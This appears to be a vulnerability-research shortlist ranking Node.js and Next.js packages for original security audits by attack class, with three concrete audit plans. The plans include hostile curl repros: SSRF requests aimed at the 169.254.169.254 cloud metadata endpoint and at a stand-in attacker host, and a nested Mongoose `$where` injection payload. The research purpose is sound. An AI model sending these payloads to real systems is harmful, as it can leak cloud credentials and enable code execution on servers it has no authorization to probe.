# Node/Next.js audit-target shortlist — request-reachable packages

Source: research pass, 2026-06-16. Ranked candidates for ORIGINAL source→sink discovery, validatable
by curl. Scoring = (downloads / blast radius) × (attack-surface richness) × (recurring CVE history).
Download counts ≈ current weekly — re-confirm on npmjs.com at audit time.

## Tier A — audit first (priority order)

1. **Next.js internals** (~10M+/wk) — image optimizer `?url=` (SSRF), `x-middleware-subrequest`
   (auth bypass), RSC/server-action deserializer (DoS + source-code exposure). Recurring & default-
   reachable; Dec 2025 13-CVE batch with **fix incomplete twice** (CVE-2025-55183/55184/67779) →
   more deserialization bugs likely.
2. **ejs** (~13M/wk) — request data → render *options* (`outputFunctionName`/`closeDelimiter`/
   `localsName`) → `Function()` compile → **SSTI/RCE**. Option-injection class keeps yielding sinks.
3. **axios** (~100M/wk) — user URL → outbound request; baseURL escape / redirect / proxy bypass →
   **SSRF + cred leak**. 3 SSRF CVEs in ~18mo (39338, 27152, 62718) = URL/proxy logic is fertile.
4. **Mongoose** (~3M/wk) — user JSON filter/`match`/`populate` → `$where` local JS eval → **NoSQL→RCE**.
   CVE-2024-53900 → **bypassed** by CVE-2025-23061 (nested under `$or`/`populate`) → more nesting paths.
5. **DOMPurify (SSR) / sanitize-html / marked** (~8M / 2.5M / 13M /wk) — user HTML/markdown rendered
   server-side → **mXSS/sanitizer bypass / ReDoS**. DOMPurify re-breaks yearly (47875, 45801, 26791).
6. **multer / busboy** (~8M / 17M /wk) — multipart upload stream lifecycle/error paths → **DoS** (FD/mem
   exhaustion, crash). 3 DoS CVEs in a year (47935, 7338, 2026-2359); brittle, trivially curl-reachable.
7. **qs** (~70M+/wk) — query + urlencoded body, attacker-controlled keys → **prototype pollution + DoS**.
   Default-reachable in nearly every Express app → best generalization. Re-audit depth/bracket parser.
8. **fast-xml-parser / xml2js** (~12M / 25M /wk) — XML body tag/attr names → **prototype pollution → RCE**.
   CVE-2023-26920 / -0842; real chained RCE in n8n via XML webhook. Underaudited path.
9. **sharp / image-size / jimp** (~8M / 25M / 2M /wk) — untrusted image bytes/dimensions → native/JS
   decoders → **memory corruption / DoS / decompression bomb**. Perennial source.
10. **jsonwebtoken / jose / next-auth** (~20M / 30M / 2M /wk) — Bearer/cookie/JWKS → verify/alg/kid
    resolution → **auth bypass** (alg confusion, kid injection). Class chronically re-breaks.

## Tier B — strong secondary (11–30)
pug · handlebars · nunjucks (SSTI) · lodash.merge/deepmerge (proto pollution) · node-fetch/got/undici
(SSRF) · serve-static/send (path traversal, esp. Windows device names, cf. Node CVE-2025-27210) ·
body-parser · formidable · js-yaml · sequelize/knex.raw/prisma `$queryRawUnsafe` (SQLi) ·
express-fileupload (zip-slip/proto) · cookie/cookie-parser · tar/unzipper/adm-zip (zip-slip) ·
content-type/negotiator/accepts (ReDoS) · semver/ms/moment (ReDoS).

## Default-reachability winners (hit most live apps at common config)
**qs proto-pollution · Next.js image SSRF + middleware bypass · multer DoS · Mongoose `$where`.**
Conditionally reachable (need a common-but-not-default pattern): SSTI engines, axios/node-fetch SSRF
(needs user-URL-fetch endpoint), SSR sanitizers, raw SQL builders.

## First 3 concrete audit plans

### A) Next.js image optimizer SSRF + RSC deserializer (highest value)
- **Start**: `_next/image` handler — `matchRemotePattern` / URL normalize-before-`fetch`; separately the
  RSC decode loop behind CVE-2025-55184's incomplete fix.
- **Hypothesis**: allowlist normalization desynced from the actual fetch (redirect on whitelisted host,
  `\\`/`@`/userinfo/IDN/IP-encoding) → fetch `169.254.169.254`. For RSC, a new malformed payload shape
  re-triggers the loop the fix missed.
- **Repro**: `create-next-app`, pin unpatched 15.x, `remotePatterns` = one trusted host.
  `curl 'http://localhost:3000/_next/image?url=https://trusted.host/redirect?to=http://169.254.169.254/latest/meta-data/&w=64&q=1'`.

### B) Mongoose `$where` / operator smuggling → RCE
- **Start**: `Query.prototype.cast`, the `match` sanitizer (added 8.8.3), `populate()` nested options.
- **Hypothesis**: operator blocklist is shallow; `$where` reachable under `$and`/`$nor`/`$elemMatch`/
  nested `populate.match` the patch didn't cover.
- **Repro**: Express + Mongoose 8.9.x, `find(filter).populate({path,match})` from JSON param.
  `curl … -d '{"$or":[{"$and":[{"$where":"sleep(5000)||true"}]}]}'` → confirm via timing.

### C) axios SSRF / proxy-bypass differential
- **Start**: `buildFullPath`/`combineURLs`/`isAbsoluteURL` + `NO_PROXY`/`shouldProxy` host normalization.
- **Hypothesis**: trailing-dot / IPv6-bracket / userinfo / `@` parsing differs between proxy decision
  and actual connection; or a new relative-vs-absolute confusion re-opens baseURL escape.
- **Repro**: `GET /fetch?u=` doing `axios.get(u,{baseURL:'https://api.internal.svc'})` + proxy +
  `NO_PROXY=internal.svc`. `curl 'http://localhost:3000/fetch?u=http://169.254.169.254./latest/meta-data/'`
  (trailing dot) and `?u=//attacker.tld/`.

## Relatively hardened (lower yield)
`send`/`serve-static` core path logic (stable since 2018), `jose` (well-audited), `body-parser` core.
Still worth config-dependent edge checks.

Full source URL list in the 2026-06-16 research transcript.
